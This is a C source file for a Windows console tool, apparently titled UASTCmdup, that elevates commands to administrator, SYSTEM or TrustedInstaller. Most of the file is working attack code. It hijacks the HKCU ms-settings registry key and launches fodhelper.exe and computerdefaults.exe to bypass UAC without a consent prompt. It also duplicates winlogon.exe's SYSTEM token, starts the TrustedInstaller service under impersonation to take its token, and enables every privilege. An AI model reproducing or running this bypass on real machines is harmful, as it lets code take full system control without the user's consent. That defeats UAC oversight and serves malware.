/*
 * UASTCmdup.exe - 控制台提权引擎
 *
 * 提权策略 (三级降级):
 *   1. fodhelper.exe        劫持 ms-settings 协议
 *   2. computerdefaults.exe 同样读取 ms-settings 协议
 *   3. ShellExecuteEx runas 标准 UAC 提权
 *
 * 新进程检测 (命名事件同步):
 *   父进程创建命名事件 Local\UASTEvt_<PID>_<Tick>, 并把事件名通过
 *   --notify 参数写入注册表命令行。新进程启动后立即 OpenEvent +
 *   SetEvent 通知父进程。父进程用 WaitForSingleObject 精确等待,
 *   不再依赖轮询扫描, 从根本上消除时序竞态。
 *
 * 防重复提权:
 *   每次降级前用 HasAdminSibling 检查是否已存在同路径的管理员实例。
 *   若存在, 说明前一次提权实际已成功, 直接返回成功, 避免产生多个
 *   管理员进程。
 *
 * 控制台日志:
 *   优先附着到父进程控制台; 若失败则分配新控制台并显式置于前台。
 *
 * 作者: 明明月明月11019 (哔哩哔哩)
 *        https://space.bilibili.com/3707056078982013
 *
 * 许可证: 详见 LICENSE 文件
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0601
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <shellapi.h>
#include <sddl.h>
#include <userenv.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>
#include <wchar.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")

 // ============================================================================
 // 常量
 // ============================================================================

 /** 程序版本号。 */
static const WCHAR* APP_VERSION = L"1.0.0";

/**
 * 提权等待超时 (毫秒)。
 *
 * 新进程启动后应立即 SetEvent 通知父进程, 因此实际耗时通常是
 * 亚秒级。10 秒是防御性上限, 覆盖极慢系统或冷启动场景。
 */
#define ELEVATE_TIMEOUT_MS 10000

 // ============================================================================
 // 执行选项
 // ============================================================================

 /**
  * 子进程启动参数集合。
  * 由命令行解析填充, 传递给 GetTargetToken / ExecuteWithToken。
  */
typedef struct _LaunchOptions {
    WCHAR target[MAX_PATH * 4];       // 目标命令行
    WCHAR currentDirectory[MAX_PATH]; // 工作目录 (空则继承)
    int   userMode;      // 0=管理员 1=SYSTEM 2=TI 3=当前用户
    int   privMode;      // 0=默认 1=全部启用 2=全部禁用
    int   integMode;     // 0=默认 1=System 2=High 3=Medium 4=Low
    int   priorityMode;  // 0=默认 1=实时 2=高 3=Above 4=Normal 5=Below 6=Idle
    int   windowMode;    // 0=显示 1=隐藏 2=最大 3=最小
    BOOL  wait;          // 是否等待子进程结束
} LaunchOptions;

/**
 * 命令行解析结果。
 * valid = FALSE 时 errorMsg 保存错误原因。
 */
typedef struct _ParsedCmdLine {
    LaunchOptions options;
    BOOL          showHelp;
    BOOL          showVersion;
    BOOL          valid;
    WCHAR         errorMsg[256];
} ParsedCmdLine;

// ============================================================================
// 全局状态
// ============================================================================

/** 控制台输出句柄。 */
static HANDLE g_hConsole = INVALID_HANDLE_VALUE;

/** 控制台是否由本进程创建 (而非附着到父控制台)。 */
static BOOL   g_bOwnConsole = FALSE;

/**
 * 父进程通过 --notify 参数传入的事件名。
 * 本进程启动后应立即 OpenEvent + SetEvent 通知父进程。
 * 空字符串表示本进程是顶层启动, 无需通知。
 */
static WCHAR  g_notifyEventName[256] = { 0 };

// ============================================================================
// 帮助文本
// ============================================================================

static const WCHAR* HELP_TEXT =
L"UASTCmdup - 控制台提权引擎\r\n"
L"\r\n"
L"用法:\r\n"
L"  UASTCmdup.exe [选项] 命令行\r\n"
L"\r\n"
L"选项 (不区分大小写, 前缀 - / -- 等价, 分隔符 : / = 等价):\r\n"
L"\r\n"
L"  -U:[T|S|C|E]          指定运行身份\r\n"
L"      T                 TrustedInstaller\r\n"
L"      S                 SYSTEM\r\n"
L"      C                 当前用户 (保持当前权限)\r\n"
L"      E                 当前用户 (提权为管理员)\r\n"
L"\r\n"
L"  -P:[E|D]              指定令牌特权\r\n"
L"      E                 启用全部特权\r\n"
L"      D                 禁用全部特权\r\n"
L"\r\n"
L"  -M:[S|H|M|L]          指定完整性级别\r\n"
L"      S                 System\r\n"
L"      H                 High\r\n"
L"      M                 Medium\r\n"
L"      L                 Low\r\n"
L"\r\n"
L"  -Priority:[Idle|BelowNormal|Normal|AboveNormal|High|RealTime]\r\n"
L"                        指定进程优先级\r\n"
L"\r\n"
L"  -ShowWindowMode:[Show|Hide|Maximize|Minimize]\r\n"
L"                        指定窗口显示模式\r\n"
L"\r\n"
L"  -CurrentDirectory:[路径]  指定子进程工作目录\r\n"
L"  -Wait                 等待子进程结束后退出\r\n"
L"  -Version              显示版本信息\r\n"
L"  -?  -H  -Help         显示本帮助\r\n"
L"\r\n"
L"内部参数 (由引擎自身使用, 用户无需关心):\r\n"
L"  --notify \"<事件名>\"   父进程等待此事件被 SetEvent\r\n"
L"\r\n"
L"示例:\r\n"
L"\r\n"
L"  以 SYSTEM 身份运行命令提示符:\r\n"
L"    UASTCmdup.exe -U:S cmd.exe\r\n"
L"\r\n"
L"  以 TrustedInstaller 身份, 启用全部特权, System 完整性,\r\n"
L"  实时优先级运行命令:\r\n"
L"    UASTCmdup.exe -U:T -P:E -M:S -Priority:RealTime -Wait cmd.exe /c whoami\r\n";

// ============================================================================
// 控制台日志
// ============================================================================

/**
 * 初始化控制台输出。
 *
 * 优先级:
 *   1. 附着到父进程控制台 (从 CMD 启动时复用现有窗口)
 *   2. 分配新控制台 (从 GUI 或双击启动时)
 *   3. 若句柄仍无效, 再次尝试分配
 *
 * 无论哪种情况, 都显式显示控制台窗口并置于前台,
 * 确保从 GUI 启动时用户能看到日志输出。
 */
static void InitConsole(void)
{
    HWND hConWnd;

    g_hConsole = INVALID_HANDLE_VALUE;

    // ---- 1. 尝试附着到父进程控制台 ----
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        // ---- 2. 分配新控制台 ----
        if (AllocConsole()) {
            SetConsoleTitleW(L"UASTCmdup - 日志");
            g_bOwnConsole = TRUE;
        }
    }

    // ---- 3. 获取 stdout 句柄, 检查有效性 ----
    g_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    if (g_hConsole == INVALID_HANDLE_VALUE || g_hConsole == NULL) {
        if (AllocConsole()) {
            g_bOwnConsole = TRUE;
            g_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        }
    }

    // ---- 4. 显式显示控制台窗口并置于前台 ----
    hConWnd = GetConsoleWindow();
    if (hConWnd) {
        ShowWindow(hConWnd, SW_SHOW);
        ShowWindow(hConWnd, SW_RESTORE);
        SetForegroundWindow(hConWnd);
        BringWindowToTop(hConWnd);
    }
}

/**
 * 向控制台输出格式化宽字符。
 * 直接调用 WriteConsoleW, 绕过 stdio 编码转换。
 */
static void Log(const WCHAR* fmt, ...)
{
    WCHAR buf[2048];
    DWORD written = 0;
    int len;
    va_list args;

    if (g_hConsole == INVALID_HANDLE_VALUE) return;

    va_start(args, fmt);
    len = _vsnwprintf_s(buf, _countof(buf), _TRUNCATE, fmt, args);
    va_end(args);

    if (len <= 0) return;

    WriteConsoleW(g_hConsole, buf, (DWORD)len, &written, NULL);
}

/**
 * 若命令行里带有 --notify, 通知父进程本进程已成功启动。
 *
 * 时机: 尽早调用, 以便父进程尽快得知提权成功并停止降级。
 * 即使后续流程失败, 父进程也已经知道"新进程起来了"这个事实。
 */
static void NotifyParentIfNeeded(void)
{
    HANDLE hEvt;

    if (!g_notifyEventName[0]) return;

    hEvt = OpenEventW(EVENT_MODIFY_STATE, FALSE, g_notifyEventName);
    if (hEvt) {
        SetEvent(hEvt);
        CloseHandle(hEvt);
    }
}

/**
 * 非正常退出时暂停, 便于用户查看错误信息。
 * 仅在控制台由本进程创建时暂停。
 */
static void PauseOnError(int exitCode)
{
    HANDLE hIn;
    DWORD mode = 0;
    DWORD read = 0;
    WCHAR buf[2];

    if (exitCode == 0) return;
    if (!g_bOwnConsole) return;
    if (g_hConsole == INVALID_HANDLE_VALUE) return;

    Log(L"\n[!] 程序异常退出 (错误码 %d)\n", exitCode);
    Log(L"[!] 按任意键关闭窗口...\n");

    hIn = GetStdHandle(STD_INPUT_HANDLE);
    GetConsoleMode(hIn, &mode);
    SetConsoleMode(hIn, mode & ~ENABLE_ECHO_INPUT);

    ReadConsoleW(hIn, buf, 1, &read, NULL);

    SetConsoleMode(hIn, mode);
}

// ============================================================================
// 通用工具
// ============================================================================

/** 判断 str 是否以 prefix 开头 (不区分大小写)。 */
static BOOL StartsWithICase(const WCHAR* str, const WCHAR* prefix)
{
    size_t n = wcslen(prefix);
    if (wcslen(str) < n) return FALSE;
    return _wcsnicmp(str, prefix, n) == 0;
}

/** 就地转换字符串为大写。 */
static void ToUpperW(WCHAR* s)
{
    for (; *s; s++) *s = (WCHAR)towupper(*s);
}

/** 从 "U:T" 形式中提取冒号/等号后的值。 */
static BOOL ExtractValue(const WCHAR* arg, const WCHAR* key, WCHAR* out, size_t cch)
{
    size_t kn = wcslen(key);
    WCHAR sep;

    if (wcslen(arg) <= kn) return FALSE;
    sep = arg[kn];
    if (sep != L':' && sep != L'=') return FALSE;

    wcsncpy_s(out, cch, arg + kn + 1, _TRUNCATE);
    return TRUE;
}

// ============================================================================
// 提权核心
// ============================================================================

/** 对当前进程主令牌启用指定特权。 */
static BOOL EnablePrivilege(LPCWSTR name)
{
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL ok;
    DWORD err;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, name, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

/** 检查当前进程是否以管理员身份运行。 */
static BOOL IsCurrentProcessAdmin(void)
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

/** 按进程名查找 PID。同名取第一个。 */
static DWORD FindProcessId(LPCWSTR name)
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;

    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/** 判断进程映像路径是否与 targetPath 一致。 */
static BOOL IsProcessPathEqual(HANDLE hProcess, LPCWSTR targetPath)
{
    WCHAR buf[MAX_PATH * 2] = { 0 };
    DWORD size = _countof(buf);

    if (!QueryFullProcessImageNameW(hProcess, 0, buf, &size)) return FALSE;
    return _wcsicmp(buf, targetPath) == 0;
}

/**
 * 检查是否已存在与本程序同路径的管理员实例。
 *
 * 用途: 降级前防重复检查。若前一次提权实际已成功, 但父进程因某
 *       种原因没收到通知, 这里能发现已存在的管理员实例, 避免重
 *       复提权产生多个管理员进程。
 */
static BOOL HasAdminSibling(LPCWSTR selfPath, DWORD myPid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    BOOL found = FALSE;

    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc;
            HANDLE hToken = NULL;
            TOKEN_ELEVATION elevation;
            DWORD retLen = 0;

            if (pe.th32ProcessID == myPid) continue;

            hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            if (IsProcessPathEqual(hProc, selfPath)) {
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    ZeroMemory(&elevation, sizeof(elevation));
                    if (GetTokenInformation(hToken, TokenElevation,
                        &elevation, sizeof(elevation), &retLen)) {
                        if (elevation.TokenIsElevated) found = TRUE;
                    }
                    CloseHandle(hToken);
                }
            }
            CloseHandle(hProc);
            if (found) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// ============================================================================
// UAC 绕过 (三级降级)
// ============================================================================

static const WCHAR* MS_SETTINGS_KEY = L"Software\\Classes\\ms-settings";

/** 删除劫持写入的注册表键。 */
static void RestoreRegistry(void)
{
    RegDeleteTreeW(HKEY_CURRENT_USER, MS_SETTINGS_KEY);
}

/**
 * 使用指定触发程序尝试 UAC 绕过。
 *
 * 同步机制:
 *   父进程创建一个命名事件, 把事件名通过 --notify 参数写入注册表
 *   命令行。新进程启动后 OpenEvent + SetEvent 通知父进程。父进程
 *   用 WaitForSingleObject 精确等待, 不再依赖轮询扫描。
 *
 * @param triggerExe        触发程序名 (fodhelper.exe 等)
 * @param originalCmdLine   原始参数 (不含 exe 路径)
 * @param myPid             当前进程 PID
 * @param selfPath          自身完整路径
 * @return                  TRUE 提权成功; FALSE 失败
 */
static BOOL TryBypassWith(LPCWSTR triggerExe, LPCWSTR originalCmdLine,
    DWORD myPid, LPCWSTR selfPath)
{
    WCHAR eventName[256];
    WCHAR cmdLine[MAX_PATH * 10];
    WCHAR sysDir[MAX_PATH];
    WCHAR triggerPath[MAX_PATH * 2];
    HANDLE hEvent = NULL;
    HKEY hKey = NULL;
    LSTATUS st;
    SHELLEXECUTEINFOW sei;
    BOOL launched;
    BOOL success;
    DWORD wr;

    // ---- 1. 创建命名事件 (名字含 PID + Tick, 避免多次尝试冲突) ----
    swprintf_s(eventName, _countof(eventName),
        L"Local\\UASTEvt_%lu_%lu",
        myPid, GetTickCount());

    hEvent = CreateEventW(NULL, TRUE, FALSE, eventName);
    if (!hEvent) {
        Log(L"    [!] CreateEvent 失败, 错误码 %lu\n", GetLastError());
        return FALSE;
    }

    // ---- 2. 拼新命令行: "自身路径" --notify "事件名" [原参数] ----
    swprintf_s(cmdLine, _countof(cmdLine),
        L"\"%s\" --notify \"%s\"", selfPath, eventName);
    if (originalCmdLine && *originalCmdLine) {
        wcscat_s(cmdLine, _countof(cmdLine), L" ");
        wcscat_s(cmdLine, _countof(cmdLine), originalCmdLine);
    }

    // ---- 3. 写入注册表劫持 ----
    st = RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (st != ERROR_SUCCESS) {
        Log(L"    [!] RegCreateKeyEx 失败, 错误码 %ld\n", st);
        CloseHandle(hEvent);
        return FALSE;
    }

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        (BYTE*)cmdLine,
        (DWORD)((wcslen(cmdLine) + 1) * sizeof(WCHAR)));
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        (BYTE*)L"", sizeof(WCHAR));
    RegCloseKey(hKey);

    Log(L"    [*] 注册表已写入\n");
    Log(L"    [*] 事件名: %s\n", eventName);
    Log(L"    [*] 命令行: %s\n", cmdLine);

    // ---- 4. 启动触发程序 ----
    GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(triggerPath, MAX_PATH * 2, L"%s\\%s", sysDir, triggerExe);

    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    sei.lpVerb = L"open";
    sei.lpFile = triggerPath;
    sei.nShow = SW_SHOWNORMAL;

    launched = ShellExecuteExW(&sei);
    if (sei.hProcess) CloseHandle(sei.hProcess);

    if (!launched) {
        Log(L"    [!] 启动 %s 失败, 错误码 %lu\n", triggerExe, GetLastError());
        RestoreRegistry();
        CloseHandle(hEvent);
        return FALSE;
    }
    Log(L"    [*] %s 已启动\n", triggerExe);

    // ---- 5. 等待新进程通知 (等待事件被 SetEvent) ----
    Log(L"    [*] 等待新进程通知 (最多 %d 秒)...\n", ELEVATE_TIMEOUT_MS / 1000);

    wr = WaitForSingleObject(hEvent, ELEVATE_TIMEOUT_MS);
    success = (wr == WAIT_OBJECT_0);

    // ---- 6. 清理 ----
    RestoreRegistry();
    CloseHandle(hEvent);
    Log(L"    [*] 注册表已清理\n");

    if (success) {
        Log(L"    [+] 收到新进程通知, 提权成功\n");
    }
    else {
        Log(L"    [!] 未收到新进程通知, 提权失败 (等待超时)\n");
    }

    return success;
}

/** 使用标准 UAC 提权 (ShellExecuteEx runas)。 */
static BOOL TryShellExecuteRunAs(LPCWSTR originalCmdLine)
{
    WCHAR selfPath[MAX_PATH];
    SHELLEXECUTEINFOW sei;

    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) return FALSE;

    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = selfPath;
    sei.lpParameters = originalCmdLine;
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        Log(L"    [!] ShellExecute runas 失败, 错误码 %lu\n", GetLastError());
        return FALSE;
    }
    Log(L"    [*] 已触发标准 UAC 提权\n");
    if (sei.hProcess) CloseHandle(sei.hProcess);
    return TRUE;
}

/**
 * 三级降级 UAC 绕过。
 *
 * 每次降级前用 HasAdminSibling 检查是否已存在管理员实例, 若存在
 * 视为前一次实际已成功, 直接返回, 避免重复提权。
 */
static BOOL TryElevateWithFallback(LPCWSTR originalCmdLine, LPCWSTR selfPath)
{
    DWORD myPid = GetCurrentProcessId();

    // ---- 第 1 级: fodhelper ----
    Log(L"[*] 尝试 fodhelper.exe 劫持...\n");
    if (TryBypassWith(L"fodhelper.exe", originalCmdLine, myPid, selfPath)) {
        return TRUE;
    }

    if (HasAdminSibling(selfPath, myPid)) {
        Log(L"[*] 已存在管理员实例, 视为提权成功\n");
        return TRUE;
    }

    // ---- 第 2 级: computerdefaults ----
    Log(L"\n[*] fodhelper 失败, 尝试 computerdefaults.exe...\n");
    if (TryBypassWith(L"computerdefaults.exe", originalCmdLine, myPid, selfPath)) {
        return TRUE;
    }

    if (HasAdminSibling(selfPath, myPid)) {
        Log(L"[*] 已存在管理员实例, 视为提权成功\n");
        return TRUE;
    }

    // ---- 第 3 级: 标准 UAC ----
    Log(L"\n[*] 协议劫持均失败, 使用标准 UAC 提权...\n");
    if (TryShellExecuteRunAs(originalCmdLine)) {
        return TRUE;
    }

    Log(L"[!] 所有提权方式均失败\n");
    return FALSE;
}

// ============================================================================
// 令牌获取与调整
// ============================================================================

/** 从 winlogon.exe 复制 SYSTEM 模拟令牌。 */
static HANDLE GetImpersonationTokenFromWinlogon(void)
{
    DWORD pid = FindProcessId(L"winlogon.exe");
    HANDLE hProc, hToken, hDup;

    if (!pid) return NULL;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;

    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);

    hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken);
        return NULL;
    }
    CloseHandle(hToken);
    return hDup;
}

/** 从 winlogon.exe 复制 SYSTEM 主令牌。 */
static HANDLE GetSystemPrimaryToken(void)
{
    DWORD pid = FindProcessId(L"winlogon.exe");
    HANDLE hProc, hToken, hPrimary;

    if (!pid) return NULL;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;

    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);

    hPrimary = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimary)) {
        CloseHandle(hToken);
        return NULL;
    }
    CloseHandle(hToken);
    return hPrimary;
}

/** 启动 TrustedInstaller 服务。需在 SYSTEM 模拟状态下调用。 */
static BOOL StartTrustedInstallerService(void)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE hSvc;
    SERVICE_STATUS status;
    BOOL ok;
    DWORD err;

    if (!hSCM) return FALSE;

    hSvc = OpenServiceW(hSCM, L"TrustedInstaller",
        SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    ZeroMemory(&status, sizeof(status));
    if (QueryServiceStatus(hSvc, &status) &&
        status.dwCurrentState == SERVICE_RUNNING) {
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return TRUE;
    }

    ok = StartServiceW(hSvc, 0, NULL);
    err = GetLastError();
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ok || err == ERROR_SERVICE_ALREADY_RUNNING;
}

/** 复制 TrustedInstaller.exe 的主令牌。必须在 SYSTEM 模拟状态下调用。 */
static HANDLE GetTrustedInstallerToken(void)
{
    DWORD pid = 0;
    int i;
    HANDLE hProc, hToken, hPrimary;

    for (i = 0; i < 30; i++) {
        pid = FindProcessId(L"TrustedInstaller.exe");
        if (pid) break;
        Sleep(500);
    }
    if (!pid) return NULL;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;

    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);

    hPrimary = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimary)) {
        CloseHandle(hToken);
        return NULL;
    }
    CloseHandle(hToken);
    return hPrimary;
}

/** 启用令牌中全部可用特权。 */
static void EnableAllTokenPrivileges(HANDLE hToken)
{
    DWORD size = 0;
    PTOKEN_PRIVILEGES p;
    DWORD i;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &size);
    if (!size) return;

    p = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, size);
    if (!p) return;

    if (GetTokenInformation(hToken, TokenPrivileges, p, size, &size)) {
        for (i = 0; i < p->PrivilegeCount; i++)
            p->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, p, 0, NULL, NULL);
    }
    LocalFree(p);
}

/** 禁用令牌中全部特权。 */
static void DisableAllTokenPrivileges(HANDLE hToken)
{
    DWORD size = 0;
    PTOKEN_PRIVILEGES p;
    DWORD i;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &size);
    if (!size) return;

    p = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, size);
    if (!p) return;

    if (GetTokenInformation(hToken, TokenPrivileges, p, size, &size)) {
        for (i = 0; i < p->PrivilegeCount; i++)
            p->Privileges[i].Attributes = 0;
        AdjustTokenPrivileges(hToken, FALSE, p, 0, NULL, NULL);
    }
    LocalFree(p);
}

/** 设置令牌完整性级别。 */
static BOOL SetTokenIntegrity(HANDLE hToken, LPCWSTR sidStr)
{
    PSID sid = NULL;
    TOKEN_MANDATORY_LABEL tml;
    DWORD size;
    BOOL ok;

    if (!ConvertStringSidToSidW(sidStr, &sid)) return FALSE;

    ZeroMemory(&tml, sizeof(tml));
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = sid;

    size = sizeof(tml) + GetLengthSid(sid);
    ok = SetTokenInformation(hToken, TokenIntegrityLevel, &tml, size);
    LocalFree(sid);
    return ok;
}

/** 根据选项调整令牌: 特权 + 完整性级别 + 会话 ID。 */
static void AdjustTokenForOptions(HANDLE hToken, const LaunchOptions* opt)
{
    DWORD sid;

    if (opt->privMode == 1)       EnableAllTokenPrivileges(hToken);
    else if (opt->privMode == 2)  DisableAllTokenPrivileges(hToken);

    switch (opt->integMode) {
    case 1: SetTokenIntegrity(hToken, L"S-1-16-16384"); break;
    case 2: SetTokenIntegrity(hToken, L"S-1-16-12288"); break;
    case 3: SetTokenIntegrity(hToken, L"S-1-16-8192");  break;
    case 4: SetTokenIntegrity(hToken, L"S-1-16-4096");  break;
    }

    sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    SetTokenInformation(hToken, TokenSessionId, &sid, sizeof(sid));
}

/** 根据 userMode 获取目标身份令牌。 */
static HANDLE GetTargetToken(int userMode, WCHAR* errBuf, DWORD errSize)
{
    // 管理员 / 当前用户: 复制当前进程令牌
    if (userMode == 0 || userMode == 3) {
        HANDLE hToken = NULL;
        HANDLE hPrimary = NULL;

        if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            wcsncpy_s(errBuf, errSize, L"OpenProcessToken 失败", _TRUNCATE);
            return NULL;
        }
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
            SecurityImpersonation, TokenPrimary, &hPrimary)) {
            wcsncpy_s(errBuf, errSize, L"DuplicateTokenEx 失败", _TRUNCATE);
            CloseHandle(hToken);
            return NULL;
        }
        CloseHandle(hToken);
        return hPrimary;
    }

    // SYSTEM: 从 winlogon.exe 复制主令牌
    if (userMode == 1) {
        HANDLE hPrimary = GetSystemPrimaryToken();
        if (!hPrimary) wcsncpy_s(errBuf, errSize, L"无法获取 SYSTEM 令牌", _TRUNCATE);
        return hPrimary;
    }

    // TrustedInstaller: 模拟 SYSTEM → 启动服务 → 复制令牌
    if (userMode == 2) {
        HANDLE hSysImp = GetImpersonationTokenFromWinlogon();
        HANDLE hPrimary;

        if (!hSysImp) {
            wcsncpy_s(errBuf, errSize, L"无法获取 SYSTEM 模拟令牌", _TRUNCATE);
            return NULL;
        }

        if (!ImpersonateLoggedOnUser(hSysImp)) {
            wcsncpy_s(errBuf, errSize, L"ImpersonateLoggedOnUser 失败", _TRUNCATE);
            CloseHandle(hSysImp);
            return NULL;
        }

        StartTrustedInstallerService();
        hPrimary = GetTrustedInstallerToken();

        RevertToSelf();
        CloseHandle(hSysImp);

        if (!hPrimary)
            wcsncpy_s(errBuf, errSize, L"无法获取 TrustedInstaller 令牌", _TRUNCATE);
        return hPrimary;
    }

    wcsncpy_s(errBuf, errSize, L"未知的用户模式", _TRUNCATE);
    return NULL;
}

/** 将优先级选项映射到 CreateProcess 的优先级类常量。 */
static DWORD GetPriorityClassValue(int mode)
{
    switch (mode) {
    case 1: return REALTIME_PRIORITY_CLASS;
    case 2: return HIGH_PRIORITY_CLASS;
    case 3: return ABOVE_NORMAL_PRIORITY_CLASS;
    case 4: return NORMAL_PRIORITY_CLASS;
    case 5: return BELOW_NORMAL_PRIORITY_CLASS;
    case 6: return IDLE_PRIORITY_CLASS;
    }
    return 0;
}

/** 将窗口模式选项映射到 ShowWindow 的常量。 */
static int GetShowWindowValue(int mode)
{
    switch (mode) {
    case 0: return SW_SHOWNORMAL;
    case 1: return SW_HIDE;
    case 2: return SW_SHOWMAXIMIZED;
    case 3: return SW_SHOWMINIMIZED;
    }
    return SW_SHOWNORMAL;
}

/** 以指定令牌创建子进程执行目标命令。 */
static BOOL ExecuteWithToken(HANDLE hToken, const LaunchOptions* opt,
    WCHAR* errBuf, DWORD errSize)
{
    WCHAR cmdLine[MAX_PATH * 6];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR workDir[MAX_PATH];
    LPVOID env = NULL;
    DWORD prio;
    BOOL ok;

    swprintf_s(cmdLine, _countof(cmdLine),
        L"cmd.exe /c \"%s\"", opt->target);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = (WORD)GetShowWindowValue(opt->windowMode);

    ZeroMemory(&pi, sizeof(pi));

    if (opt->currentDirectory[0])
        wcsncpy_s(workDir, MAX_PATH, opt->currentDirectory, _TRUNCATE);
    else
        GetCurrentDirectoryW(MAX_PATH, workDir);

    CreateEnvironmentBlock(&env, hToken, FALSE);

    ok = CreateProcessWithTokenW(
        hToken, 0, NULL, cmdLine,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
        env, workDir, &si, &pi);

    if (!ok) {
        swprintf_s(errBuf, errSize,
            L"CreateProcessWithTokenW 失败, 错误码 %lu", GetLastError());
        if (env) DestroyEnvironmentBlock(env);
        return FALSE;
    }

    Log(L"[+] 子进程已启动, PID: %lu\n", pi.dwProcessId);

    prio = GetPriorityClassValue(opt->priorityMode);
    if (prio) SetPriorityClass(pi.hProcess, prio);

    if (opt->wait) WaitForSingleObject(pi.hProcess, INFINITE);

    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

